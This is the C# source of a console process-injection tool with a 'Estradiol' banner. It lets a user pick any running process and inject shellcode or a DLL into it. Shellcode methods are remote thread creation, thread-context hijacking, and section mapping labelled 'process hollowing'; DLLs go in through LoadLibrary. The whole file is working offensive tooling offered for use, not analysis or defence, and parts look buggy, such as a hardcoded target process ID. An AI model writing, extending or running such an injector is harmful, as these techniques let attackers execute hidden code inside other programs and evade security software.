using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using static Native;

class injector
{


    static Dictionary<string, string> shellMethods = new Dictionary<string, string>
    {
        {"1" , "remote" } ,
        {"2" , "hijack" } ,
        {"3" , "hollow" } ,
        
    };

    static Dictionary<string, string> dllMethods = new Dictionary<string, string>
    {
        {"1" , "loadlibrary" } ,

    };

    static string type , method;
    static Process proc_to_inj;
    static byte[] buffer;


    static void logo()
    {
        // Print "Logo"
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("\r\n███████╗░██████╗████████╗██████╗░░█████╗░██████╗░██╗░█████╗░██╗░░░░░\r\n██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗██║░░░░░\r\n█████╗░░╚█████╗░░░░██║░░░██████╔╝███████║██║░░██║██║██║░░██║██║░░░░░\r\n██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██╔══██║██║░░██║██║██║░░██║██║░░░░░\r\n███████╗██████╔╝░░░██║░░░██║░░██║██║░░██║██████╔╝██║╚█████╔╝███████╗\r\n╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚══════╝");
        Console.WriteLine("");
        Console.ForegroundColor = ConsoleColor.White;
    }

    static string selectInjectionType()
    {
        string res = "";
        Console.Write("");
        Console.WriteLine("Injection type: ");
        Console.WriteLine("1. Shellcode");
        Console.WriteLine("2. Dynamic Link Library");

        while(!res.Equals("shellcode") |!res.Equals("Dll"))
        {
            res = Console.ReadLine();

            if(res.Equals("1") || res.Equals("2"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                res = res.Equals("1") ? "shellcode" : "Dll";
                Console.WriteLine($"Successfully selected {res} as Injection type");
                Console.ForegroundColor = ConsoleColor.White;
                break;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(res + " is not a valid Injection type");
            Console.ForegroundColor = ConsoleColor.White;

        }
        Console.Clear();
        logo();
        return res;
    }

    static void question(string str)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("[?] " + str);
        Console.ForegroundColor = ConsoleColor.White;
    }

    static void success(string str)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] " + str);
        Console.ForegroundColor = ConsoleColor.White;
    }

    static void failed(string str)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("[-] " + str);
        Console.ForegroundColor = ConsoleColor.White;
    
    }

    static void injected(string str)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("[+] " + str);
        Console.ForegroundColor = ConsoleColor.White;
    }

    static void remoteThreadInjection()
    {
        // get process handle
        question("Getting proc handle");
        
        IntPtr proc_handle = proc_to_inj.Handle;
        Thread.Sleep(500);

        if (proc_handle == IntPtr.Zero)
        {
            failed("Unable to retreive proc handle");
            Environment.Exit(0);
        }

        success("Successfully retreived proc handle");
        
        //Allocate memory to the proc
        question($"Allocating {buffer.Length} bytes to memory address 0x" + proc_handle.ToString("X"));
        Thread.Sleep(500);

        IntPtr alloc_addr = VirtualAllocEx(proc_handle, IntPtr.Zero, (uint)buffer.Length, 0x1000 | 0x2000, 0x40); // Commit | Reserve , ExecuteReadWrite @pinvoke

        if (alloc_addr == IntPtr.Zero)
        {
            failed("Unable to allocate memory");
            Environment.Exit(0);
        }

        success($"Successfully allocated {buffer.Length} bytes to memory address 0x" + proc_handle.ToString("X"));


        //Write bytecode to memory of target proc
        question($"Mapping {buffer.Length} bytes to allocated memory address: 0x" + alloc_addr.ToString("X"));
        Thread.Sleep(2000);

        IntPtr written_bytes;
        bool mem_success = WriteProcessMemory(proc_handle, alloc_addr, buffer, (uint)buffer.Length, out written_bytes);

        if (!mem_success)
        {
            failed("Unable to map bytecode to memory at: 0x" + alloc_addr.ToString("X"));
            Environment.Exit(0);
        }

        success($"Successfully mapped {buffer.Length} bytes into memory at: 0x" + alloc_addr.ToString("X"));

        //Create a remote thread to execute loadlibrary

        success("Creating remote thread to execute bytecode");
        Thread.Sleep(500);


        IntPtr thread_handle = CreateRemoteThread(proc_handle, IntPtr.Zero, 0, alloc_addr, IntPtr.Zero, 0, IntPtr.Zero);


        if (thread_handle == IntPtr.Zero)
        {
            failed("Unable to create remote thread");
            Environment.Exit(0);
        }

        success("Successfully created remote thread");
        injected($"Successfully mapped and executed shellcode into {proc_to_inj}");
        Thread.Sleep(500);
        
    }

    static void threadHijacking()
    {
        // Get process thread
        ProcessThread thread = proc_to_inj.Threads[0];

        // Get proc handle
        question("Getting proc handle");
        IntPtr proc_handle = proc_to_inj.Handle;
        Thread.Sleep(500);

        if (proc_handle == IntPtr.Zero)
        {
            failed("Unable to retreive proc handle");
            Environment.Exit(0);
        }

        success("Successfully retreived proc handle");


        // Get thread handle
        question("Getting thread handle");
        IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, thread.Id);
        Thread.Sleep(500);

        if (hThread == IntPtr.Zero)
        {
            failed("Unable to retreive thread handle");
            Environment.Exit(0);
        }

        success("Successfully retreived thread handle");

        // Allocate memory to the proc thread
        question($"Allocating {buffer.Length} bytes to memory address 0x" + proc_handle.ToString("X"));
        IntPtr alloc_addr = VirtualAllocEx(proc_handle, IntPtr.Zero, (uint)buffer.Length, 0x1000 | 0x2000, 0x40); // Commit | Reserve , ExecuteReadWrite @pinvoke
        Thread.Sleep(500);

        if (alloc_addr == IntPtr.Zero)
        {
            failed("Unable to allocate memory");
            Environment.Exit(0);
        }

        success($"Successfully allocated {buffer.Length} bytes to memory address 0x" + proc_handle.ToString("X"));

        // Write shellcode to thread context
        question("Writing shellcode to thread context");
        bool mem_success = WriteProcessMemory(proc_handle, alloc_addr, buffer, (uint)buffer.Length, out IntPtr lpNumberOfBytesWritten);
        Thread.Sleep(500);

        if (!mem_success)
        {
            failed("Unable to write shellcode to thread context");
            Environment.Exit(0);
        }

        success("Successfully wrote shellcode to thread context");

        // Suspend thread
        question("Suspending thread");
        SuspendThread(hThread);
        Thread.Sleep(500);

        // Get thread context
        question("Getting thread context");
        CONTEXT64 ctx = new CONTEXT64();
        ctx.ContextFlags = 0x10001F;
        bool ctx_success = GetThreadContext(hThread, ref ctx);
        Thread.Sleep(1500);

        if (!ctx_success)
        {
            failed("Unable to get thread context");
            Environment.Exit(0);
        }

        success("Successfully got thread context");

        // Modify thread context
        question("Modifying thread context");
        ctx.Rip = (ulong)alloc_addr;
        ctx_success = SetThreadContext(hThread, ref ctx);
        Thread.Sleep(500);

        if (!ctx_success)
        {
            failed("Unable to modify thread context");
            Environment.Exit(0);
        }

        success("Successfully modified thread context");

        // Resume thread
        question("Resuming thread");
        ResumeThread(hThread);
        success("Successfully resumed thread");
        
    }

    static void processHollowing()
    {

        IntPtr hSectionHandle = IntPtr.Zero;
        ulong size = (ulong)  buffer.Length;

        // create a new section to map view to
        question("Creating new section to map view to");
        UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);
        Thread.Sleep(2000);

        if (result != 0x00000000)
        {
            failed("Unable to create new section");
            Environment.Exit(0);
        }
        success($"Successfully created new section of {size} bytes at: 0x" + hSectionHandle.ToString("X"));

        // create a local view
        IntPtr pLocalView = IntPtr.Zero;
        UInt64 offset = 0;
        result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, 0x2, 0, MemoryProtection.PAGE_READWRITE);
        question("Creating local view at 0x" + result.ToString("X"));
        Thread.Sleep(2500);

        if (result != 0x00000000)
        {
            failed("Unable to create local view");
            Environment.Exit(0);
        }

        success("Successfully created local view at 0x" + result.ToString("X"));

        // copy shellcode to the local view
        question("Copying shellcode to local view");
        Marshal.Copy(buffer, 0, pLocalView, buffer.Length);
        Thread.Sleep(1000);
        success("Successfully copied shellcode to local view");


        // create a remote view of the section in the target
        IntPtr pRemoteView = IntPtr.Zero;
        result = NtMapViewOfSection(hSectionHandle, proc_to_inj.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, 0x2, 0, MemoryProtection.PAGE_EXECUTE_READ);
        question("Creating remote view of section at 0x" + result.ToString("X"));

        Thread.Sleep(1000);

        if (result != 0x00000000)
        {
            failed("Unable to create remote view of section in target");
            Environment.Exit(0);
        }
        success("Successfully created remote view of section in target");

        // execute the shellcode
        question("Creating user thread to execute shellcode");
        IntPtr hThread = IntPtr.Zero;
        CLIENT_ID cid = new CLIENT_ID();
        hThread = RtlCreateUserThread(proc_to_inj.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
        success("Successfully created user thread to execute shellcode");

    }

    static void loadLibraryInjection()
    {

        IntPtr handle = OpenProcess(0x001F0FFF, false, 25380);
        IntPtr LibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");


        // Allocate memory
        question($"Allocating {buffer.Length} bytes to memory address 0x" + handle.ToString("X"));
        IntPtr AllocatedMemory = VirtualAllocEx(handle, IntPtr.Zero, (uint)buffer.Length + 1, 0x00001000, 4); //0x00001000: Memory - commit, 4: Page - Read and Write

        if(AllocatedMemory == IntPtr.Zero)
        {
            failed("Failed to allocate memory");
            Environment.Exit(0);
        }
        success($"Successfully allocated {buffer.Length} bytes to memory address 0x" + handle.ToString("X"));

        // Write dllpath to memory
        question("Writing dll path to memory address");
        IntPtr bytesWritten;
        bool mem_success = WriteProcessMemory(handle, AllocatedMemory, buffer, (uint)buffer.Length + 1, out bytesWritten);

        if (!mem_success)
        {
            failed("Failed to write dll path to memory");
        }

        success("Successfully wrote dll path to memory");

        IntPtr threadHandle = CreateRemoteThread(handle, IntPtr.Zero, 0, LibraryAddress, AllocatedMemory, 0, IntPtr.Zero);

        WaitForSingleObject(handle, 0xFFFFFFFF);
        CloseHandle(threadHandle);
        VirtualFreeEx(handle, AllocatedMemory, buffer.Length + 1, 0x8000);
        CloseHandle(handle);
    }

    static byte[] selectInjectionCode()
    {
        Console.WriteLine("");
        Console.WriteLine("Enter path of code to inject ");
        string path = "";
        byte[] res = { };

        while (true)
        {
            path = Path.GetFullPath(Console.ReadLine());

            if (File.Exists(path))
            {
                success("File was found");
                question("Converting file contents to ByteArray");
                Thread.Sleep(1000);

                if (path.IndexOf(".dll") == -1)
                {
                    string shellcode = Regex.Unescape(File.ReadAllText(path));

                    //Shellcode to ByteArray conversion
                    res = new byte[shellcode.Length];

                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        res[i] = (byte)shellcode[i];
                        question($"Current byte: {(byte)shellcode[i]}");
                        Thread.Sleep(25);

                    }
                    success("Successfully converted file contents to ByteArray");
                    Thread.Sleep(1000);
                    Console.Clear();
                    logo();
                }
                else
                {
                    res = Encoding.Unicode.GetBytes(path);

                }

                  
                break;

            }

            failed($"File at path {path} was not found");

        }
        return res;
    }

    static Process selectProcess()
    {
        Process[] available_procs = Process.GetProcesses();
        Process final_proc = null;
        bool valid_proc = false;

        question("Scanning all available processes");
        Thread.Sleep(1000);

        for (int i = 0; i < available_procs.Length; i++)
        {
            success($"[{i + 1}] {available_procs[i].ProcessName}");
            Thread.Sleep(10);
        }

        Console.WriteLine($"All available Processes listed above [{available_procs.Length}]");
        Console.WriteLine("Enter a Process name: ");

        while (!valid_proc)
        {

            string process = Console.ReadLine();

            foreach (Process proc in available_procs)
            {
                if (process.Equals(proc.ProcessName))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    string output_str = type.Equals("shellcode") ? $"Shellcode will be mapped into {proc}" : $"Dll will be injected into {proc}";
                    question(output_str);
                    Thread.Sleep(500);
                    final_proc = proc;
                    valid_proc = true;
                    break;
                }
            }

            if (valid_proc)
            {
                break;
            }

            failed($"The process {process} cant be found!");

            
            Console.WriteLine("Enter a valid proc name");
        }
        Console.Clear();
        logo();
        return final_proc;

    }

    static string selectInjectionMethod()
    {
        // Select injection method
        Console.WriteLine("Select injection method: ");

        if (type.Equals("shellcode"))
        {
            Console.WriteLine("1. Remote Thread Injection");
            Console.WriteLine("2. Thread Hijacking");
            Console.WriteLine("3. Process Hollowing");
        }
        else
        {
            Console.WriteLine("1. LoadLibrary");
        }

        string method = Console.ReadLine();
        bool valid_selection = type.Equals("shellcode") ? method.Equals("1") || method.Equals("2") || method.Equals("3") : method.Equals("1");
        string res = "";

        do
        {
            if (valid_selection)
            {
                string selected_method = type.Equals("shellcode") ? shellMethods[method] : dllMethods[method];
                res = selected_method.ToLower();
                break;
            }
            else
            {
                failed("Invalid selection");
                Console.WriteLine("Select a valid injection method");
                method = Console.ReadLine();
            }
        } while (!valid_selection);

        Console.Clear();
        logo();
        return res;

    }

    static void injectionHandlerDll()
    {
        if (method.Equals("loadlibrary"))
        {
            loadLibraryInjection();
        }
    }

    static void injectionHandlerShellcode()
    {
        if (method.Equals("remote"))
        {
            remoteThreadInjection();
        }
        else if (method.Equals("hijack"))
        {
            threadHijacking();
        }
        else if (method.Equals("hollow"))
        {
            processHollowing();
        }
        else
        {
            failed("Invalid mapping type");
            Environment.Exit(0);
        }
    }

    static void injectionTypeHandler()
    {


        if(type.Equals("shellcode"))
        {
            injectionHandlerShellcode();
        }
        else 
        {
            injectionHandlerDll();
            Console.WriteLine(method);
        }

    }



    static void Main(string[] args)
    {
         logo();
         type = selectInjectionType();
         method = selectInjectionMethod();
         proc_to_inj = selectProcess();
         buffer = selectInjectionCode();
        injectionTypeHandler();

        Console.WriteLine("Press any key to exit");
        Console.ReadKey();
        Environment.Exit(0);

    } 

}